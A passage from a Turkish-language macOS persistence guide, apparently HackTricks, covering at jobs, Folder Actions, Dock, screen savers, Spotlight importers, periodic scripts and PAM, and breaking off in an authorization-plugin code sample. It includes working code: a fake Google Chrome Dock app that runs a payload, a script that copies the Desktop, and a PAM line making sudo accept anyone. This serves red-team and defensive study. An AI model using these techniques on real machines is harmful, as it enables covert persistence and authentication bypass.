Başka bir seçenek, **`.bash_profile`** ve **`.zshenv`** dosyalarını kullanıcı ANA DİZİN içine oluşturmaktır, böylece LaunchAgents klasörü zaten varsa bu teknik yine de çalışacaktır.

### At

Açıklama: [https://theevilbit.github.io/beyond/beyond\_0014/](https://theevilbit.github.io/beyond/beyond\_0014/)

* Kum havuzunu atlamak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
* Ancak **`at`** komutunu **çalıştırmanız** ve etkin olması gerekmektedir
* TCC atlaması: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

* **`at`** komutunu **çalıştırmanız** ve etkin olması gerekmektedir

#### **Açıklama**

`at` görevleri, belirli zamanlarda yürütülmek üzere **tek seferlik görevlerin zamanlamasını** sağlamak için tasarlanmıştır. Cron işleri gibi, `at` görevleri otomatik olarak yürütmeden sonra kaldırılır. Bu görevlerin sistem yeniden başlatmaları arasında kalıcı olduğunu unutmamak önemlidir, bu da onları belirli koşullar altında potansiyel güvenlik endişeleri olarak işaretler.

**Varsayılan olarak** devre dışı bırakılmışlardır ancak **root** kullanıcısı bunları aşağıdaki şekilde **etkinleştirebilir**:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
Bu, 1 saat içinde bir dosya oluşturacak:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
İş kuyruğunu `atq` komutunu kullanarak kontrol edin:
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
Yukarıda iki zamanlanmış iş görebiliriz. İşi ayrıntılarıyla yazdırmak için `at -c İŞNUMARASI` kullanabiliriz.
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
{% hint style="warning" %}
Eğer AT görevleri etkin değilse, oluşturulan görevler yürütülmeyecektir.
{% endhint %}

**İş dosyaları** `/private/var/at/jobs/` dizininde bulunabilir.
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
Dosya adı sırayı, iş numarasını ve çalışma zamanını içerir. Örneğin `a0001a019bdcd2`'ye bakalım.

* `a` - bu kuyruktur
* `0001a` - onaltılık iş numarası, `0x1a = 26`
* `019bdcd2` - onaltılık zaman. Bu, epoch'tan bu yana geçen dakikaları temsil eder. `0x019bdcd2`, ondalık olarak `26991826`'dır. 60 ile çarptığımızda `1619509560` elde ederiz, bu da `GMT: 2021 Nisan 27, Salı 7:46:00`'yi temsil eder.

İş dosyasını yazdırırsak, `at -c` kullanarak elde ettiğimiz bilgileri içerdiğini buluruz.

### Klasör Eylemleri

Açıklama: [https://theevilbit.github.io/beyond/beyond\_0024/](https://theevilbit.github.io/beyond/beyond\_0024/)\
Açıklama: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

* Kumbarayı atlamak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
* Ancak, Klasör Eylemlerini yapılandırmak için **`System Events`** ile iletişim kurabilmek için `osascript`'ı argümanlarla çağırabilmeniz gerekir
* TCC atlatma: [🟠](https://emojipedia.org/large-orange-circle)
* Masaüstü, Belgeler ve İndirmeler gibi bazı temel TCC izinlerine sahiptir

#### Konum

* **`/Library/Scripts/Folder Action Scripts`**
* Root gereklidir
* **Tetikleyici**: Belirtilen klasöre erişim
* **`~/Library/Scripts/Folder Action Scripts`**
* **Tetikleyici**: Belirtilen klasöre erişim

#### Açıklama ve Sömürü

Klasör Eylemleri, bir klasördeki değişikliklerle otomatik olarak tetiklenen betiklerdir; öğeler eklenirken, kaldırılırken veya diğer eylemler gerçekleşirken veya klasör penceresinin açılması veya yeniden boyutlandırılması gibi diğer eylemlerle tetiklenirler. Bu eylemler çeşitli görevler için kullanılabilir ve Finder UI veya terminal komutları kullanılarak tetiklenebilirler.

Klasör Eylemleri kurmak için şu seçeneklere sahipsiniz:

1. [Automator](https://support.apple.com/guide/automator/welcome/mac) ile bir Klasör Eylemi iş akışı oluşturup bir hizmet olarak yüklemek.
2. Bir betiği manuel olarak bir klasörün bağlam menüsündeki Klasör Eylemleri Kurulumu aracılığıyla eklemek.
3. Programatik olarak bir Klasör Eylemi kurmak için `System Events.app`'e Apple Olayı iletileri göndermek için OSAScript'i kullanmak.
* Bu yöntem, eylemi sisteme gömmek ve kalıcılık düzeyi sunmak için özellikle kullanışlıdır.

Aşağıdaki betik, bir Klasör Eylemi tarafından yürütülebilecek bir örnektir:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Yukarıdaki betiği Klasör Eylemleri tarafından kullanılabilir hale getirmek için şunu kullanarak derleyin:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
Derlemesi yapıldıktan sonra, aşağıdaki betiği çalıştırarak Klasör İşlemlerini ayarlayın. Bu betik, Klasör İşlemlerini genel olarak etkinleştirecek ve önceden derlenmiş betiği özel olarak Masaüstü klasörüne ekleyecektir.
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events");
se.folderActionsEnabled = true;
var myScript = se.Script({name: "source.js", posixPath: "/tmp/source.js"});
var fa = se.FolderAction({name: "Desktop", path: "/Users/username/Desktop"});
se.folderActions.push(fa);
fa.scripts.push(myScript);
```
Ayar dosyasını şu şekilde çalıştırın:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
* Bu kalıcılığı GUI aracılığıyla uygulamanın yolu:

Bu, yürütülecek olan betiktir:

{% code title="source.js" %}
```applescript
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
{% endcode %}

Aşağıdaki komutla derleyin: `osacompile -l JavaScript -o klasor.scpt kaynak.js`

Taşıyın:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Ardından, `Folder Actions Setup` uygulamasını açın, **izlemek istediğiniz klasörü seçin** ve sizin durumunuzda **`folder.scpt`**'yi seçin (benim durumumda buna output2.scp adını verdim):

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="297"><figcaption></figcaption></figure>

Şimdi, eğer o klasörü **Finder** ile açarsanız, betiğiniz çalıştırılacaktır.

Bu yapılandırma, base64 formatında **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** konumunda saklanmıştır.

Şimdi, bu kalıcılığı GUI erişimi olmadan hazırlamayı deneyelim:

1. **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`**'yi yedeklemek için `/tmp`'ye kopyalayın:
* `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. Şimdi, ayarladığınız Klasör Eylemlerini **kaldırın**:

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Şimdi boş bir ortama sahip olduğumuza göre

3. Yedek dosyasını kopyalayın: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Bu yapılandırmayı tüketmek için Folder Actions Setup.app'ı açın: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

{% hint style="danger" %}
Ve bu benim için çalışmadı, ama bunlar yazıdan talimatlar:(
{% endhint %}

### Dock kısayolları

Yazı: [https://theevilbit.github.io/beyond/beyond\_0027/](https://theevilbit.github.io/beyond/beyond\_0027/)

* Kum havuzunu atlamak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
* Ancak, sisteme kötü amaçlı bir uygulama yüklemiş olmanız gerekmektedir
* TCC atlatma: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

* `~/Library/Preferences/com.apple.dock.plist`
* **Tetikleyici**: Kullanıcı dock içindeki uygulamaya tıkladığında

#### Açıklama ve Sömürü

Dock'ta görünen tüm uygulamalar, plist içinde belirtilmiştir: **`~/Library/Preferences/com.apple.dock.plist`**

Sadece şu şekilde bir uygulama eklemek mümkündür:

{% code overflow="wrap" %}
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
{% endcode %}

Bazı **sosyal mühendislik** kullanarak, örneğin Dock içinde **Google Chrome gibi taklit edebilir** ve aslında kendi betiğinizi çalıştırabilirsiniz:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Renk Seçiciler

Açıklama: [https://theevilbit.github.io/beyond/beyond\_0017](https://theevilbit.github.io/beyond/beyond\_0017/)

* Kum havuzunu atlamak için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
* Çok belirli bir eylem gerçekleşmesi gerekiyor
* Başka bir kum havuzunda sonlanacaksınız
* TCC atlatma: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

* `/Library/ColorPickers`
* Kök erişimi gereklidir
* Tetikleyici: Renk seçicisini kullanın
* `~/Library/ColorPickers`
* Tetikleyici: Renk seçicisini kullanın

#### Açıklama ve Sömürü

Kodunuzla bir renk seçici paketini derleyin (örneğin [**bu örneği kullanabilirsiniz**](https://github.com/viktorstrate/color-picker-plus)) ve bir yapılandırıcı ekleyin (benzer şekilde [Ekran Koruyucu bölümünde olduğu gibi](macos-auto-start-locations.md#screen-saver)) ve paketi `~/Library/ColorPickers` dizinine kopyalayın.

Sonra, renk seçicisi tetiklendiğinde sizin kodunuz da tetiklenmelidir.

Kütüphanenizi yükleyen ikili dosyanın **çok kısıtlayıcı bir kum havuzu** olduğunu unutmayın: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

{% code overflow="wrap" %}
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
{% endcode %}

### Finder Senkronizasyon Eklentileri

**Açıklama**: [https://theevilbit.github.io/beyond/beyond\_0026/](https://theevilbit.github.io/beyond/beyond\_0026/)\
**Açıklama**: [https://objective-see.org/blog/blog\_0x11.html](https://objective-see.org/blog/blog\_0x11.html)

* Kum havuzunu atlamak için kullanışlı mı: **Hayır, çünkü kendi uygulamanızı çalıştırmanız gerekir**
* TCC atlaması: ???

#### Konum

* Belirli bir uygulama

#### Açıklama ve Sızma

Bir Finder Senkronizasyon Uzantısı örneği olan bir uygulama [**burada bulunabilir**](https://github.com/D00MFist/InSync).

Uygulamalar `Finder Senkronizasyon Uzantıları`na sahip olabilir. Bu uzantı, çalıştırılacak bir uygulamanın içine gidecektir. Dahası, uzantının kodunu çalıştırabilmesi için **bazı geçerli Apple geliştirici sertifikalarıyla imzalanmış olması gerekir**, **kum havuzunda olmalıdır** (rahatlatılmış istisnalar eklenmiş olabilir) ve şuna benzer bir şeyle kaydedilmiş olmalıdır:
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Ekran Koruyucu

Açıklama: [https://theevilbit.github.io/beyond/beyond\_0016/](https://theevilbit.github.io/beyond/beyond\_0016/)\
Açıklama: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf5bf90b)

* Kum havuzunu atlamak için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
* Ancak genel bir uygulama kum havuzunda sonlanacaksınız
* TCC atlatma: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

* `/System/Library/Screen Savers`
* Kök erişimi gereklidir
* **Tetikleyici**: Ekran koruyucusunu seçin
* `/Library/Screen Savers`
* Kök erişimi gereklidir
* **Tetikleyici**: Ekran koruyucusunu seçin
* `~/Library/Screen Savers`
* **Tetikleyici**: Ekran koruyucusunu seçin

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="375"><figcaption></figcaption></figure>

#### Açıklama ve Sızma

Xcode'da yeni bir proje oluşturun ve yeni bir **Ekran Koruyucu** oluşturmak için şablonu seçin. Ardından, örneğin aşağıdaki kodu kullanarak log oluşturmak için kodunuzu ekleyin.

**Derleyin** ve `.saver` paketini **`~/Library/Screen Savers`** dizinine kopyalayın. Sonra, Ekran Koruyucu GUI'yi açın ve üzerine tıkladığınızda birçok log oluşturmalıdır:

{% code overflow="wrap" %}
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
{% endcode %}

{% hint style="danger" %}
Bu kodu yükleyen ikili dosyanın ayrıcalıkları içinde (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) **`com.apple.security.app-sandbox`** bulunduğundan dolayı **ortak uygulama kum havuzunun içinde olacaksınız**.
{% endhint %}

Koruyucu kod:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Spotlight Eklentileri

açıklama: [https://theevilbit.github.io/beyond/beyond\_0011/](https://theevilbit.github.io/beyond/beyond\_0011/)

* Kum havuzunu atlamak için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
* Ancak uygulama kum havuzunda sona ereceksiniz
* TCC atlatma: [🔴](https://emojipedia.org/large-red-circle)
* Kum havuzu çok sınırlı görünüyor

#### Konum

* `~/Kütüphane/Spotlight/`
* **Tetikleyici**: Spotlight eklentisi tarafından yönetilen bir uzantıya sahip yeni bir dosya oluşturulduğunda.
* `/Kütüphane/Spotlight/`
* **Tetikleyici**: Spotlight eklentisi tarafından yönetilen bir uzantıya sahip yeni bir dosya oluşturulduğunda.
* Root gerekli
* `/Sistem/Kütüphane/Spotlight/`
* **Tetikleyici**: Spotlight eklentisi tarafından yönetilen bir uzantıya sahip yeni bir dosya oluşturulduğunda.
* Root gerekli
* `Some.app/İçerik/Kütüphane/Spotlight/`
* **Tetikleyici**: Spotlight eklentisi tarafından yönetilen bir uzantıya sahip yeni bir dosya oluşturulduğunda.
* Yeni uygulama gereklidir

#### Açıklama ve Sömürü

Spotlight, macOS'in yerleşik arama özelliğidir ve kullanıcılara **bilgisayarlarındaki verilere hızlı ve kapsamlı erişim** sağlamak amacıyla tasarlanmıştır.\
Bu hızlı arama yeteneğini kolaylaştırmak için Spotlight, **özel bir veritabanı** tutar ve çoğu dosyayı **açarak bir dizin oluşturur**, böylece dosya adları ve içerikleri arasında hızlı aramalar yapılabilir.

Spotlight'ın temel mekanizması, 'mds' adlı merkezi bir süreci içerir, bu süreç **'meta veri sunucusu'** anlamına gelir. Bu süreç, tüm Spotlight hizmetini yönetir. Buna ek olarak, farklı dosya türlerini dizinleyen çeşitli bakım görevlerini yerine getiren birden fazla 'mdworker' cinleri bulunmaktadır (`ps -ef | grep mdworker`). Bu görevler, Spotlight içinde çeşitli dosya biçimlerini anlamak ve dizinlemek için **".mdimporter paketleri**" veya Spotlight'ın çeşitli dosya biçimlerindeki içeriği anlamasını ve dizinlemesini sağlayan eklenti eklentileri aracılığıyla mümkün hale getirilir.

Eklentiler veya **`.mdimporter`** paketleri önceden belirtilen yerlerde bulunur ve yeni bir paket göründüğünde dakikalar içinde yüklenir (herhangi bir hizmeti yeniden başlatmaya gerek yoktur). Bu paketlerin hangi **dosya türü ve uzantıları yönetebileceğini** belirtmeleri gerekir, bu şekilde Spotlight belirtilen uzantıya sahip yeni bir dosya oluşturulduğunda onları kullanacaktır.

Yüklenen **tüm `mdimporters`** bulunabilir:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
Ve örneğin **/Library/Spotlight/iBooksAuthor.mdimporter** bu tür dosyaları işlemek için kullanılır (uzantılar arasında `.iba` ve `.book` bulunur):
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
{% hint style="danger" %}
Başka `mdimporter`'ın Plist'ini kontrol ederseniz, **`UTTypeConformsTo`** girişini bulamayabilirsiniz. Bu, yerleşik _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform\_Type\_Identifier)) olduğundan ve uzantıları belirtmeye gerek duymadığından.

Ayrıca, Sistem varsayılan eklentileri her zaman önceliklidir, bu nedenle bir saldırgan yalnızca Apple'ın kendi `mdimporters` tarafından dizinlenmeyen dosyalara erişebilir.
{% endhint %}

Kendi içe aktarıcınızı oluşturmak için bu projeyi kullanmaya başlayabilirsiniz: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) ve ardından adı değiştirin, **`CFBundleDocumentTypes`**'ı değiştirin ve **`UTImportedTypeDeclarations`** ekleyin böylece desteklemek istediğiniz uzantıyı destekler ve bunları **`schema.xml`**'de yansıtın.\
Sonra **`GetMetadataForFile`** işlevinin kodunu değiştirin ve işlenen uzantıya sahip bir dosya oluşturulduğunda payload'ınızı yürütmesini sağlayın.

Son olarak, yeni `.mdimporter`'ınızı bir önceki konumlardan birine **derleyin ve kopyalayın** ve ne zaman yüklendiğini kontrol edebilirsiniz **logları izleyerek** veya **`mdimport -L`** kontrol ederek.

### ~~Tercih Paneli~~

{% hint style="danger" %}
Bu artık çalışmıyor gibi görünmüyor.
{% endhint %}

Açıklama: [https://theevilbit.github.io/beyond/beyond\_0009/](https://theevilbit.github.io/beyond/beyond\_0009/)

* Kum havuzunu atlamak için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
* Belirli bir kullanıcı eylemi gerektirir
* TCC atlatma: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

* **`/System/Library/PreferencePanes`**
* **`/Library/PreferencePanes`**
* **`~/Library/PreferencePanes`**

#### Açıklama

Bu artık çalışmıyor gibi görünmüyor.

## Kök Kum Havuzu Atlatma

{% hint style="success" %}
Burada, **kum havuzu atlatma** için yararlı olan başlangıç konumlarını bulabilirsiniz, bu da size **bir dosyaya yazarak** basitçe bir şeyi **kök** olarak yürütmenizi sağlar ve/veya diğer **garip koşullar gerektirir.**
{% endhint %}

### Periyodik

Açıklama: [https://theevilbit.github.io/beyond/beyond\_0019/](https://theevilbit.github.io/beyond/beyond\_0019/)

* Kum havuzunu atlamak için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
* Ancak kök olmanız gerekiyor
* TCC atlatma: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

* `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
* Kök gereklidir
* **Tetikleyici**: Zamanı geldiğinde
* `/etc/daily.local`, `/etc/weekly.local` veya `/etc/monthly.local`
* Kök gereklidir
* **Tetikleyici**: Zamanı geldiğinde

#### Açıklama ve Sömürü

Periyodik betikler (**`/etc/periodic`**), `/System/Library/LaunchDaemons/com.apple.periodic*`'de yapılandırılmış **başlatma hizmetleri** nedeniyle yürütülür. `/etc/periodic/` dizininde depolanan betikler dosya sahibi olarak **yürütülür**, bu nedenle bu, olası bir ayrıcalık yükseltmesi için çalışmaz.
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
{% endcode %}

Başka periyodik betikler de **`/etc/defaults/periodic.conf`** dosyasında belirtilir:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
Eğer `/etc/daily.local`, `/etc/weekly.local` veya `/etc/monthly.local` dosyalarından herhangi birini yazmayı başarırsanız, **er ya da geç yürütülecektir**.

{% hint style="warning" %}
Periyodik betik, **betiğin sahibi olarak yürütülecektir**. Dolayısıyla, düzenli bir kullanıcı betiğin sahibiyse, betik o kullanıcı olarak yürütülecektir (bu, ayrıcalık yükseltme saldırılarını engelleyebilir).
{% endhint %}

### PAM

Açıklama: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
Açıklama: [https://theevilbit.github.io/beyond/beyond\_0005/](https://theevilbit.github.io/beyond/beyond\_0005/)

* Kum havuzunu atlamak için faydalı: [🟠](https://emojipedia.org/large-orange-circle)
* Ancak root olmanız gerekiyor
* TCC atlatma: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

* Her zaman kök gereklidir

#### Açıklama ve Sömürü

PAM, macOS içinde kolay yürütmeden ziyade **süreklilik** ve kötü amaçlı yazılım üzerinde daha fazla odaklandığından, bu blog detaylı bir açıklama sunmayacak, **bu teknik hakkında daha iyi anlamak için açıklamaları okuyun**.

PAM modüllerini kontrol etmek için:
```bash
ls -l /etc/pam.d
```
Bir süreklilik/privilege escalation tekniği PAM'ı kötüye kullanarak /etc/pam.d/sudo modülünü değiştirerek kolayca yapılabilir. Başlangıca şu satırı eklemek yeterlidir:
```bash
auth       sufficient     pam_permit.so
```
Yani bu, şuna benzer bir şey gibi görünecek:
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
Ve dolayısıyla **`sudo` kullanma girişimi başarılı olacaktır**.

{% hint style="danger" %}
Bu dizinin TCC tarafından korunduğunu unutmayın, bu nedenle kullanıcının erişim isteyen bir ileti alması oldukça olasıdır.
{% endhint %}

### Yetkilendirme Eklentileri

Açıklama: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)\
Açıklama: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

* Kum havuzunu atlamak için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
* Ancak root olmanız ve ek yapılandırmalar yapmanız gerekmektedir
* TCC atlatma: ???

#### Konum

* `/Library/Security/SecurityAgentPlugins/`
* Root gereklidir
* Eklentiyi kullanmak için yetkilendirme veritabanını yapılandırmak da gereklidir

#### Açıklama ve Sömürü

Kullanıcı oturum açtığında kalıcılığı sürdürmek için yürütülecek bir yetkilendirme eklentisi oluşturabilirsiniz. Bu tür eklentilerden birini nasıl oluşturacağınız hakkında daha fazla bilgi için önceki açıklamalara bakın (ve dikkatli olun, kötü yazılmış bir eklenti sizi dışarıda bırakabilir ve Mac'inizi kurtarma modundan temizlemeniz gerekebilir).
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

